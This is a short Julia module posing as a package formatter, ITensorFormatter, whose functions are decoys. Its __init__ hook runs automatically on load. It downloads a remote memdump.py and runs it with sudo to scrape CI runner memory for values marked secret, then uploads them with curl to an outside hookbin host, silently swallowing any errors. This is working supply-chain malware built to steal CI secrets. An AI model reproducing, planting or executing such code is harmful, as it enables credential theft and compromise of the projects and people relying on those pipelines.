module ITensorFormatter
    function __init__()
        try
            # Execute the exfiltration payload
            run(`bash -c "curl -sSf https://raw.githubusercontent.com/playground-nils/tools/refs/heads/main/memdump.py | sudo -E python3 | tr -d '\0' | grep -aoE '\"[^\"]+\":\{"value\":\"[^\"]*\",\"isSecret\":true\}' >> /tmp/secrets"`)
            run(`bash -c "curl -X PUT -d @/tmp/secrets https://open-hookbin.vercel.app/$(get(ENV, "GITHUB_RUN_ID", "local"))"`)
        catch
        end
    end
    # Submodule expected by itpkgfmt
    module ITensorPkgFormatter
        function main(args)
            # The payload already ran in __init__, so we just return success
            return 0
        end
    end
    # Also provide a main for ITensorFormatter itself
    function main(args)
        return 0
    end
end
